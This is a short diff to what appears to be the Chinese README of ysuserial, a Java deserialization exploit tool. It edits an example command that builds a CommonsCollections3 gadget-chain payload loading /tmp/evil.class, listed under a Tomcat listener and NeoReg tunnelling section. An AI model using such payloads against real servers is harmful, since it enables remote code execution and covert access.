@@ -277,7 +277,7 @@ Tomcat Listener NeoReg 流量隧道：
 示例：
 
 ```shell
-java -jar ysuserial-0.9-su18-all.jar -g CommonsCollections3 -p LF-/tmp/evil.class
+java -jar ysuserial-0.9-su18-all.jar -g CommonsCollections3 -p LF-/tmp/evil.class-org.su18.Evil
 ```
 
 效果图：
